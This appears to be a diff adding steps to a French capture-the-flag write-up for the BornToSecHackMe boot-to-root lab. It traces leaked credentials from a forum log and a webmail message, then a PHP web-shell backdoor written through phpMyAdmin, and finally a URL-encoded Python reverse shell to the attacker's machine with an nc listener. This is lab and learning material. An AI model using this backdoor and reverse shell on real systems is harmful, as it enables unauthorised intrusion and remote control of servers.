@@ -76,10 +76,90 @@ Nous voyons ici plusieurs routes que nous allons explorer pour voir si nous trou
 ![b2r_1](./photos/b2r_1.png)
 
 En fouillant un peu dans la section 'Probleme login ?' nous trouvons quelque chose d'interessant : 
-
-curl --insecure https://192.168.1.50/forum/index.php\?id\=6 | grep "invalid user"
 ```
+curl --insecure https://192.168.1.50/forum/index.php\?id\=6 | grep "invalid user"
 Oct  5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2<br />
 ```
+Grace a ce mot de passe nous pouvons nous connecter sur le forum avec le couple lmezard/!q\]Ej?*5K5cy*AJ
 
+Nous pouvons recuperer alors l'adresse mail associé a cet identifiant : laurie@borntosec.net
 
+### Webmail
+
+Lorsque nous nous connectons, nous voyons la présence d'un mail DB access avec une pair root/Fg-'kKXBj87E:aJ$. 
+```
+Hey Laurie,
+
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+Best regards.
+```
+Connectons nous alors a la db via phpmyadmin
+
+### phpMyAdmin
+
+Nous arrivons donc a nous connecter a la db en tant que root grace au mdp fourni sur la boite mail de lmezard.
+
+La technique la plus repandue la est de creer une backdoor dans un repertoire existant pour apres en chargeant la page adequat pourvoir executer un shell sur notre terminal
+
+```
+dirb https://192.168.1.50/forum
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Aug  9 09:59:40 2021
+URL_BASE: https://192.168.1.50/forum/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: https://192.168.1.50/forum/ ----
++ https://192.168.1.50/forum/backup (CODE:403|SIZE:293)
++ https://192.168.1.50/forum/config (CODE:403|SIZE:293)
+==> DIRECTORY: https://192.168.1.50/forum/images/
+==> DIRECTORY: https://192.168.1.50/forum/includes/
++ https://192.168.1.50/forum/index (CODE:200|SIZE:4935)
++ https://192.168.1.50/forum/index.php (CODE:200|SIZE:4935)
+==> DIRECTORY: https://192.168.1.50/forum/js/
+==> DIRECTORY: https://192.168.1.50/forum/lang/
+==> DIRECTORY: https://192.168.1.50/forum/modules/
+==> DIRECTORY: https://192.168.1.50/forum/templates_c/
+==> DIRECTORY: https://192.168.1.50/forum/themes/
+==> DIRECTORY: https://192.168.1.50/forum/update/
+```
+On va essayer de placer notre backdoor dans un de ces repertoires : /forum/templates_c
+```
+select "<?php system($_GET['cmd']); ?>" into outfile "https://192.168.1.50/var/www/forum/templates_c/backdoor.php"
+```
+
+![b2r_2](./photos/b2r_2.png)
+
+https://192.168.1.50/forum/templates_c/backdoor.php?cmd=whoami nous donne :
+```
+www-data
+```
+Notre backdoor fonctionne correctement.
+
+Ce que nous devons faire maintenant est de trouver un reverse shell que nous pourrons executer pour pouvoir se connecter au serveur. En cherchant sur internet il y a des reverse shell deja tout prets, prenons celui en python :
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.28",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+Pour pouvoir passer ce reverse shell a notre url il faudra l'encoder :
+```
+python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.28%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27%0A
+```
+ On va attendre la connexion sur notre machine Kali (machine qui a l'adresse correspondante a celle rentrée dans le reverse shell)
+ ```
+ nc -l -p 1234
+ ```
+D'une autre machine ou directement depuis le browser rentrer le reverse shell encode apres le cmd :
+
+```
+curl --insecure https://192.168.1.50/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.1.28%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27%0A
+```
